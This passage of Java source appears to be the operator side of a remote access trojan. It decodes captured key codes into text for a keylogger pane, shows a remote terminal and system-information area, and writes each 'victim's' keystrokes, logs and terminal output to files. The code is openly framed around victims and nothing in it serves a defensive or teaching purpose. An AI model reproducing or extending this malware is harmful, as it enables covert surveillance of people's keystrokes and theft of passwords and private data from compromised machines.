                if (Caps || shift) {
                    appendKeyLogArea("J");
                } else {
                    appendKeyLogArea("j");
                }
            } else if (key.equals("37")) {
                keyboard.setIcon(KeyboardIcons[51]);
                if (Caps || shift) {
                    appendKeyLogArea("K");
                } else {
                    appendKeyLogArea("k");
                }
            } else if (key.equals("38")) {
                keyboard.setIcon(KeyboardIcons[52]);
                if (Caps || shift) {
                    appendKeyLogArea("L");
                } else {
                    appendKeyLogArea("l");
                }
            } else if (key.equals("39")) {
                keyboard.setIcon(KeyboardIcons[13]);
                if (shift) {
                    appendKeyLogArea(":");
                } else {
                    appendKeyLogArea(";");

                }
            } else if (key.equals("40")) {
                keyboard.setIcon(KeyboardIcons[11]);
                if (shift) {
                    appendKeyLogArea('"' + "");
                } else {
                    appendKeyLogArea("'");

                }
            } else if (key.equals("41")) {
                keyboard.setIcon(KeyboardIcons[16]);
                if (shift) {
                    appendKeyLogArea("~");
                } else {
                    appendKeyLogArea("`");

                }

            } else if (key.equals("42")) {
                shift = true;
                keyboard.setIcon(KeyboardIcons[61]);
                appendKeyLogArea(" [SHIFT] ");

            } else if (key.equals("43")) {
                keyboard.setIcon(KeyboardIcons[63]);
                if (shift) {
                    appendKeyLogArea("|");
                } else {
                    appendKeyLogArea(new String("a").replaceAll("a", "\\\\"));

                }

            } else if (key.equals("44")) {
                keyboard.setIcon(KeyboardIcons[74]);
                if (Caps || shift) {
                    appendKeyLogArea("Z");
                } else {
                    appendKeyLogArea("z");
                }
            } else if (key.equals("45")) {
                keyboard.setIcon(KeyboardIcons[72]);
                if (Caps || shift) {
                    appendKeyLogArea("X");
                } else {
                    appendKeyLogArea("x");
                }
            } else if (key.equals("46")) {
                keyboard.setIcon(KeyboardIcons[24]);
                if (Caps || shift) {
                    appendKeyLogArea("C");
                } else {
                    appendKeyLogArea("c");
                }
            } else if (key.equals("47")) {
                keyboard.setIcon(KeyboardIcons[70]);
                if (Caps || shift) {
                    appendKeyLogArea("V");
                } else {
                    appendKeyLogArea("v");
                }
            } else if (key.equals("48")) {
                keyboard.setIcon(KeyboardIcons[22]);
                if (Caps || shift) {
                    appendKeyLogArea("B");
                } else {
                    appendKeyLogArea("b");
                }
            } else if (key.equals("49")) {
                keyboard.setIcon(KeyboardIcons[54]);
                if (Caps || shift) {
                    appendKeyLogArea("N");
                } else {
                    appendKeyLogArea("n");
                }
            } else if (key.equals("50")) {
                keyboard.setIcon(KeyboardIcons[53]);
                if (Caps || shift) {
                    appendKeyLogArea("M");
                } else {
                    appendKeyLogArea("m");
                }
            } else if (key.equals("51")) {
                keyboard.setIcon(KeyboardIcons[10]);
                if (shift) {
                    appendKeyLogArea("<");
                } else {
                    appendKeyLogArea(",");

                }

            } else if (key.equals("52")) {
                keyboard.setIcon(KeyboardIcons[29]);
                if (shift) {
                    appendKeyLogArea(">");
                } else {
                    appendKeyLogArea(".");

                }

            } else if (key.equals("53")) {
                keyboard.setIcon(KeyboardIcons[60]);
                if (shift) {
                    appendKeyLogArea("?");
                } else {
                    appendKeyLogArea("/");

                }

            } else if (key.equals("56")) {
                keyboard.setIcon(KeyboardIcons[20]);
                appendKeyLogArea(" [ALT] ");

            } else if (key.equals("57")) {
                keyboard.setIcon(KeyboardIcons[64]);
                appendKeyLogArea(" [SPACE] ");

            } else if (key.equals("58")) {
                keyboard.setIcon(KeyboardIcons[25]);
                Caps = !Caps;
                appendKeyLogArea(" [CAPS LOCK] ");

            } else if (key.equals("59")) {
                keyboard.setIcon(KeyboardIcons[34]);
                appendKeyLogArea(" [F1] ");

            } else if (key.equals("60")) {
                keyboard.setIcon(KeyboardIcons[35]);
                appendKeyLogArea(" [F2] ");

            } else if (key.equals("61")) {
                keyboard.setIcon(KeyboardIcons[36]);
                appendKeyLogArea(" [F3] ");

            } else if (key.equals("62")) {
                keyboard.setIcon(KeyboardIcons[37]);
                appendKeyLogArea(" [F4] ");

            } else if (key.equals("63")) {
                keyboard.setIcon(KeyboardIcons[38]);
                appendKeyLogArea(" [F51] ");

            } else if (key.equals("64")) {
                keyboard.setIcon(KeyboardIcons[39]);
                appendKeyLogArea(" [F6] ");

            } else if (key.equals("65")) {
                keyboard.setIcon(KeyboardIcons[40]);
                appendKeyLogArea(" [F7] ");

            } else if (key.equals("66")) {
                keyboard.setIcon(KeyboardIcons[41]);
                appendKeyLogArea(" [F8] ");

            } else if (key.equals("67")) {
                keyboard.setIcon(KeyboardIcons[42]);
                appendKeyLogArea(" [F9] ");

            } else if (key.equals("68")) {
                keyboard.setIcon(KeyboardIcons[43]);
                appendKeyLogArea(" [F10] ");

            } else if (key.equals("87")) {
                keyboard.setIcon(KeyboardIcons[44]);
                appendKeyLogArea(" [F11] ");

            } else if (key.equals("88")) {
                keyboard.setIcon(KeyboardIcons[45]);
                appendKeyLogArea(" [F12] ");

            } else if (key.equals("3675")) {
                keyboard.setIcon(KeyboardIcons[65]);
                appendKeyLogArea(" [START] ");

            } else if (key.equals("3667")) {
                appendKeyLogArea(" [DEL] ");

            } else if (key.equals("3639")) {
                appendKeyLogArea(" [INS/PRT SC] ");

            } else if (key.equals("3655")) {
                appendKeyLogArea(" [HOME] ");

            } else if (key.equals("3663")) {
                appendKeyLogArea(" [END] ");

            } else if (key.equals("3657")) {
                appendKeyLogArea(" [PG UP] ");

            } else if (key.equals("3665")) {
                appendKeyLogArea(" [PG ON] ");

            } else if (key.equals("57419")) {
                keyboard.setIcon(KeyboardIcons[65]);
                appendKeyLogArea(" [LEFT] ");

            } else if (key.equals("57421")) {
                appendKeyLogArea(" [RIGHT] ");

            } else if (key.equals("57416")) {
                appendKeyLogArea(" [UP] ");

            } else if (key.equals("57424")) {
                appendKeyLogArea(" [DOWN] ");

            } else {

                appendKeyLogArea(" [" + key + "] ");

            }
        }

    }

    private String extractCommand(String data) {

        if (!data.contains(prompt)) {
            return "";
        }

        return data.replace(prompt, "");
    }

    public void setName(String name) {
        selectedLabel.setText(name);
    }

    /**
     *
     */
    public void clearSysInfoArea() {
        sysInfoArea.setText("");
        try {
            if (Server.settingsFrame.saveVictims()) {
                Toolset.clearFile(new File(directoriesPath + "/Info.txt"));
            }
        } catch (IOException ex) {
             JOptionPane.showMessageDialog(this, ex.getMessage(), " Error writing to victims log", JOptionPane.ERROR_MESSAGE);
        }
    }

    /**
     *
     * @param info
     */
    public void appendSysInfoArea(String info) {
        sysInfoArea.append(info);
        try {
            if (Server.settingsFrame.saveVictims()) {
                Toolset.appendFile(new File(directoriesPath + "/Info.txt"), info);
            }
        } catch (IOException ex) {
             JOptionPane.showMessageDialog(this, ex.getMessage(), " Error writing to victims log", JOptionPane.ERROR_MESSAGE);
        }
    }

    /**
     *
     */
    public void clearInfoArea() {
        infoArea.setText("");
    }

    /**
     *
     * @param info
     */
    public void appendInfoArea(String info) {
        infoArea.append(info);
    }

    /**
     *
     */
    public void clearLogArea() {
        logArea.setText("");

    }

    /**
     *
     * @param info
     */
    public void appendLogArea(String info) {
        logArea.append(info);
        try {
            if (Server.settingsFrame.saveVictims()) {
                Toolset.appendFile(new File(directoriesPath + "/Log.txt"), info);
            }
        } catch (IOException ex) {
            JOptionPane.showMessageDialog(this, ex.getMessage(), " Error writing to victims log", JOptionPane.ERROR_MESSAGE);
        }
    }

    /**
     *
     * @param string
     */
    public void clearTerminalArea(String string) {
        terminalArea.setText("");
    }

    /**
     *
     * @param info
     */
    public void appendTerminalArea(String info) {
        terminalArea.append(info);
        try {
            if (Server.settingsFrame.saveVictims()) {
                Toolset.appendFile(new File(directoriesPath + "/Terminal.txt"), info);
            }
        } catch (IOException ex) {
             JOptionPane.showMessageDialog(this, ex.getMessage(), " Error writing to victims log", JOptionPane.ERROR_MESSAGE);
        }
        PC_LogAreaScroller.getVerticalScrollBar().addAdjustmentListener(new AdjustmentListener() {
            public void adjustmentValueChanged(AdjustmentEvent e) {
                PC_LogAreaScroller.getVerticalScrollBar().setValue(e.getAdjustable().getMaximum());
                PC_LogAreaScroller.getVerticalScrollBar().removeAdjustmentListener(this);
            }
        });
    }

    /**
     *
     */
    public void clearKeylogArea() {
        keyLogArea.setText("");
    }

    /**
     *
     * @param info
     */
    public void appendKeyLogArea(String info) {
        keyLogArea.append(info);
        try {
            if (Server.settingsFrame.saveVictims()) {
                Toolset.appendFile(new File(directoriesPath + "/Key-Logger.txt"), info);
            }
        } catch (IOException ex) {
             JOptionPane.showMessageDialog(this, ex.getMessage(), " Error writing to victims log", JOptionPane.ERROR_MESSAGE);
        }

    }

    /**
     *
     * @param keyCode
     * @throws InterruptedException
     * @throws IOException
     */
    public void keyPressed(String keyCode) throws InterruptedException, IOException {
        appendKey(1, keyCode);
    }

    /**
     *
     * @param keyCode
     * @throws InterruptedException
     * @throws IOException
     */
    public void keyReleased(String keyCode) throws InterruptedException, IOException {
        appendKey(2, keyCode);
    }

    /**
     *
     * @param keyCode
     * @throws InterruptedException
     * @throws IOException
     */
    public void mousePressed(String keyCode) throws InterruptedException, IOException {
        appendKey(3, keyCode);
    }

    /**
     *
     * @param keyCode
     * @throws InterruptedException
     * @throws IOException
     */
    public void mouseReleased(String keyCode) throws InterruptedException, IOException {
        appendKey(4, keyCode);
    }

}
